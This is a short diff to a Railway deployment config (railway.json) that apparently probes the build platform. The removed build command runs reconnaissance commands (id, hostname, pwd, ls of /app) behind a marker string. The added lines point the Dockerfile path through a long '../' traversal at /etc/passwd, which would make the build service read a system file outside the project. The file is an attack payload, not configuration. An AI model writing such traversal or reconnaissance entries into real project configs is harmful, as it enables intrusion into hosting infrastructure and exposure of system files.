@@ -1,6 +1,7 @@
 {
   "$schema": "https://railway.com/railway.schema.json",
   "build": {
-    "buildCommand": "sh -c 'echo RAILWAYJSON-READ-OK; id; hostname; pwd; ls -la /app | head -5'"
+    "builder": "DOCKERFILE",
+    "dockerfilePath": "../../../../../../../../etc/passwd"
   }
 }
